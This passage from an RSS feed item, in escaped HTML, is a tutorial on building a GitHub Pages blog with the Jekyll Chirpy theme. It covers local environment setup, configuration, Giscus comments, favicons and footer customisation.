href=&#34;https://github.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Github account&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;Basic knowledge of &lt;a href=&#34;https://markdownlivepreview.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Markdown&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;creating-a-site-repository&#34;&gt;&lt;span&gt;Creating a Site Repository&lt;/span&gt;&#xA;  &lt;a href=&#34;#creating-a-site-repository&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Here, I use the &lt;a href=&#34;https://chirpy.cotes.page/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Chirpy theme&lt;/strong&gt;&lt;/a&gt;, a popular theme for GitHub Pages optimized for personal or technical blogging.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Steps&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Log in to &lt;a href=&#34;https://github.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt;&lt;/a&gt; and go to the &lt;a href=&#34;https://github.com/cotes2020/chirpy-starter&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;starter&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Instead of forking, click &lt;kbd&gt;Use this template&lt;/kbd&gt; and select &lt;kbd&gt;Create a new repository&lt;/kbd&gt; to automatically create a Site Repository.&lt;/li&gt;&#xA;&lt;li&gt;Name the new repository &lt;code&gt;&amp;lt;username&amp;gt;.github.io&lt;/code&gt;, replacing &lt;code&gt;&amp;lt;username&amp;gt;&lt;/code&gt; with your GitHub username.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setting-up-the-environment&#34;&gt;&lt;span&gt;Setting up the Environment&lt;/span&gt;&#xA;  &lt;a href=&#34;#setting-up-the-environment&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;There are two main reasons to set up a local development environment for your blog:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;After pushing code to the repository, GitHub Actions takes time to run before building and rendering the site on GitHub Pages.&lt;/li&gt;&#xA;&lt;li&gt;By developing directly on your local machine, you can see changes instantly—faster and more convenient.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;using-dev-containers-recommended-for-windows&#34;&gt;&lt;span&gt;Using Dev Containers (Recommended for Windows)&lt;/span&gt;&#xA;  &lt;a href=&#34;#using-dev-containers-recommended-for-windows&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Dev Containers&lt;/strong&gt; provide an isolated environment via Docker, preventing conflicts with your system and ensuring all dependencies are managed inside the container.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Steps&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Install Docker:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;On Windows/macOS: install &lt;a href=&#34;https://www.docker.com/products/docker-desktop/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker Desktop&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;On Linux: install &lt;a href=&#34;https://docs.docker.com/engine/install/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker Engine&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Install &lt;a href=&#34;https://code.visualstudio.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;VS Code&lt;/a&gt; and the &lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-containers&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Dev Containers extension&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Clone the repository:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If using Docker Desktop: open VS Code and &lt;a href=&#34;https://code.visualstudio.com/docs/devcontainers/containers#_quick-start-open-a-git-repository-or-github-pr-in-an-isolated-container-volume&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;clone the repo in a container volume&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If using Docker Engine: clone the repo locally, then &lt;a href=&#34;https://code.visualstudio.com/docs/devcontainers/containers#_quick-start-open-an-existing-folder-in-a-container&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;open it in a container&lt;/a&gt; in VS Code.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Wait for the Dev Containers setup process to complete.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;setting-up-natively-recommended-for-unix-like-os&#34;&gt;&lt;span&gt;Setting up Natively (Recommended for Unix-like OS)&lt;/span&gt;&#xA;  &lt;a href=&#34;#setting-up-natively-recommended-for-unix-like-os&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;For Unix-like systems (Linux, macOS), you can set up the environment directly (natively) for better performance. Dev Containers are still available as an alternative.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Steps&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Follow the &lt;a href=&#34;https://jekyllrb.com/docs/installation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Jekyll installation guide&lt;/a&gt; and ensure &lt;a href=&#34;https://git-scm.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Git&lt;/a&gt; is installed.&lt;/li&gt;&#xA;&lt;li&gt;Clone the repository locally.&lt;/li&gt;&#xA;&lt;li&gt;If you forked the theme, install &lt;a href=&#34;https://nodejs.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Node.js&lt;/a&gt; and run &lt;code&gt;bash tools/init.sh&lt;/code&gt; in the root folder to initialize the repo.&lt;/li&gt;&#xA;&lt;li&gt;Run the following commands in the root folder to install gems into &lt;code&gt;./vendor/bundle/&lt;/code&gt; within the project—no need for &lt;strong&gt;sudo&lt;/strong&gt; and no changes to &lt;code&gt;/var/lib/gems..&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;bundle config set --local path &amp;#39;vendor/bundle&amp;#39;&#xA;bundle install&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;usage&#34;&gt;&lt;span&gt;Usage&lt;/span&gt;&#xA;  &lt;a href=&#34;#usage&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;start-the-jekyll-server&#34;&gt;&lt;span&gt;Start the Jekyll Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#start-the-jekyll-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;To run the site locally, use:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;bundle exec jekyll s&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;configuration&#34;&gt;&lt;span&gt;Configuration&lt;/span&gt;&#xA;  &lt;a href=&#34;#configuration&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Some variables to configure in &lt;code&gt;_config.yml&lt;/code&gt; include:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;lang&lt;/code&gt;: set the website language&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;url&lt;/code&gt;: your website URL&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;title&lt;/code&gt;: main title shown under the avatar&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;tagline&lt;/code&gt;: subtitle or site description&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;avatar&lt;/code&gt;: supports local and CORS resources, including &lt;code&gt;gif&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;comment-feature-via-giscus&#34;&gt;&lt;span&gt;Comment feature via Giscus&lt;/span&gt;&#xA;  &lt;a href=&#34;#comment-feature-via-giscus&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;We’ll use &lt;a href=&#34;https://giscus.app&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Giscus&lt;/strong&gt;&lt;/a&gt; as the comment system. Other free alternatives include &lt;a href=&#34;https://disqus.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Disqus&lt;/strong&gt;&lt;/a&gt; and &lt;a href=&#34;https://utteranc.es/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Utterances&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Steps&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Install &lt;a href=&#34;https://github.com/apps/giscus&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;giscus&lt;/strong&gt;&lt;/a&gt; on GitHub.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;In your repository &lt;strong&gt;Settings&lt;/strong&gt;, go to &lt;strong&gt;General&lt;/strong&gt; and enable &lt;strong&gt;Discussions&lt;/strong&gt; so giscus can store comments.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Enter the repository name &lt;code&gt;&amp;lt;username&amp;gt;/&amp;lt;username&amp;gt;.github.io&lt;/code&gt;. A green checkmark will appear when requirements are met.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Choose the discussion category and topic for your site.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Configure giscus in &lt;code&gt;_config.yml&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;provider&lt;/code&gt;: set to giscus&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;giscus&lt;/code&gt;: map the variables you set on &lt;a href=&#34;https://github.com/apps/giscus&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;giscus&lt;/strong&gt;&lt;/a&gt; to the &lt;code&gt;giscus&lt;/code&gt; section&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;customize-the-favicon&#34;&gt;&lt;span&gt;Customize the Favicon&lt;/span&gt;&#xA;  &lt;a href=&#34;#customize-the-favicon&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a custom &lt;strong&gt;favicon&lt;/strong&gt; for your website instead of using the theme’s default.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Steps&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Go to &lt;a href=&#34;https://www.favicon-generator.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Favicon Generator&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Click &lt;kbd&gt;Browse&lt;/kbd&gt; to select your favicon file, then &lt;kbd&gt;Create Favicon&lt;/kbd&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Click &lt;code&gt;Download the generated favicon&lt;/code&gt; to get the files.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Extract the downloaded file and delete these two:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;browserconfig.xml&lt;/li&gt;&#xA;&lt;li&gt;site.webmanifest&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Copy the remaining files into &lt;code&gt;assets/img/favicons&lt;/code&gt; (create the folder if it doesn’t exist).&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;extends&#34;&gt;&lt;span&gt;Extends&lt;/span&gt;&#xA;  &lt;a href=&#34;#extends&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;remove-meta-tag-in-footer&#34;&gt;&lt;span&gt;Remove meta tag in Footer&lt;/span&gt;&#xA;  &lt;a href=&#34;#remove-meta-tag-in-footer&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;You can remove the line &lt;code&gt;Using the Chirpy theme for Jekyll.&lt;/code&gt; with these steps:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Create a file at &lt;code&gt;_data/locales/en.yml&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Copy the contents of &lt;a href=&#34;https://raw.githubusercontent.com/cotes2020/jekyll-theme-chirpy/refs/heads/master/_data/locales/en.yml&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;en.yml&lt;/strong&gt;&lt;/a&gt; and paste into the new file.&lt;/li&gt;&#xA;&lt;li&gt;Change the value of &lt;code&gt;meta&lt;/code&gt; to &lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;write-a-post&#34;&gt;&lt;span&gt;Write a post&lt;/span&gt;&#xA;  &lt;a href=&#34;#write-a-post&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Check the &lt;a href=&#34;https://chirpy.cotes.page/posts/write-a-new-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;rules&lt;/strong&gt;&lt;/a&gt; for writing blog posts with this theme and use &lt;a href=&#34;https://markdownlivepreview.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Live Preview&lt;/strong&gt;&lt;/a&gt; to preview your content.&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
